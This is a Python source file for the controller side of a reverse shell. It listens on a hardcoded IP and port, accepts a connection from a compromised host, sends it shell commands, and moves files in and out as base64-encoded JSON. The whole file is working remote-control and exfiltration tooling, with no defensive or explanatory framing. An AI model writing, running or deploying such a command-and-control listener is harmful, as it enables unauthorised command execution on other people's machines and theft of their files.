import socket
import simplejson
import base64
class SocketListener:
	def __init__(self,ip,port):
		my_listener=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		my_listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
		my_listener.bind((ip,port))
		my_listener.listen(0)
		print("Listeneing bruh ...")
		(self.my_connection,my_address)=my_listener.accept()
		print("Connection OK from "+str(my_address))


	def json_send(self,data):
		json_data = simplejson.dumps(data)
		self.my_connection.send(json_data.encode("utf-8"))

	def json_receive(self):

		json_data = ""
		while True:
			try:
				json_data=json_data+self.my_connection.recv(1024).decode()
				return simplejson.loads(json_data)
			except ValueError:
				continue
			except KeyboardInterrupt:
				print("Thanks for using")

	def command_execution(self,command_input):
		self.json_send(command_input)

		if command_input[0]=="quit":
			self.my_connection.close()
			exit()


		return self.json_receive()

	def save_file(self,path,content):
		with open(path,"wb") as na_file:
			na_file.write(base64.b64decode(content))
			return "Download Done Ra"


	def get_file_content(self,path):
		with open(path,"rb") as na_file:
			return base64.b64encode(na_file.read())


	def start_listener(self):
		while True:
			command_input = input("Enter command: ")
			command_input=command_input.split(" ")
			try:
				if command_input[0] =="upload":
					na_file_content = self.get_file_content(command_input[1])
					command_input.append(na_file_content)
	
				command_output = self.command_execution(command_input)
	
				if command_input[0] == "download" and "ERROR" not in command_output:
					command_output= self.save_file(command_input[1],command_output)
			except Exception:
				command_output="ERROR"
			print(command_output)

my_socket_listener = SocketListener("192.168.0.107",4040)
my_socket_listener.start_listener()
